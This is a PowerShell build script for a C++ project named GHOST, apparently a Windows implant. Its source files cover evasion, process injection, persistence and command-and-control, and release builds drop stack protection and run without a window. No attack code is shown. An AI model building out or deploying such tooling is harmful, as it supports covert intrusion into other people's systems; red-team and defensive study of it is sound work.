# GHOST build script — requires Visual Studio Build Tools (cl.exe in PATH)
# Usage: .\build.ps1 [-Debug]
#
# To set up environment:
#   cmd /c '"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" && powershell'

param(
    [switch]$Debug
)

$ErrorActionPreference = "Stop"

# Ensure output directory exists
$outDir = "build"
if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }

# Source files
$src = @(
    "src\main.cpp",
    "src\syscalls.cpp",
    "src\evasion.cpp",
    "src\injection.cpp",
    "src\persistence.cpp",
    "src\c2.cpp",
    "src\utils.cpp"
)

# Libraries (only core system APIs, rest resolved dynamically)
$libs = @(
    "ntdll.lib",
    "user32.lib"
)

# Common compiler flags
$commonFlags = @(
    "/EHsc",
    "/W4",
    "/DUNICODE",
    "/D_UNICODE",
    "/D_CRT_SECURE_NO_WARNINGS",
    "/MT",
    "/std:c++17",
    "/I", "include",
    "/Fe${outDir}\ghost.exe",
    "/Fo${outDir}\"
)

# Build-type specific flags
if ($Debug) {
    $buildFlags = @("/Od", "/Zi", "/DDEBUG")
    Write-Host "[*] Building DEBUG configuration..." -ForegroundColor Yellow
} else {
    $buildFlags = @("/O2", "/GL", "/GS-")
    Write-Host "[*] Building RELEASE configuration..." -ForegroundColor Cyan
}

# Resource compiler
Write-Host "[*] Compiling resources..." -ForegroundColor Gray
rc /nologo /fo "${outDir}\ghost.res" "resources\ghost.rc" 2>&1 | Out-Null

# Compile and link
$allFlags = $commonFlags + $buildFlags + $src + @("${outDir}\ghost.res") + @("/link") + $libs
$allFlags += @("/SUBSYSTEM:WINDOWS", "/ENTRY:WinMainCRTStartup")

if (-not $Debug) {
    $allFlags += @("/LTCG", "/OPT:REF", "/OPT:ICF")
}

Write-Host "[*] Compiling..." -ForegroundColor Gray
& cl @allFlags 2>&1 | ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }

if ($LASTEXITCODE -eq 0) {
    $size = (Get-Item "${outDir}\ghost.exe").Length
    $sizeKB = [math]::Round($size / 1024, 1)
    Write-Host ""
    Write-Host "[+] Build succeeded: ${outDir}\ghost.exe (${sizeKB} KB)" -ForegroundColor Green
} else {
    Write-Host ""
    Write-Host "[!] Build FAILED with exit code $LASTEXITCODE" -ForegroundColor Red
    exit 1
}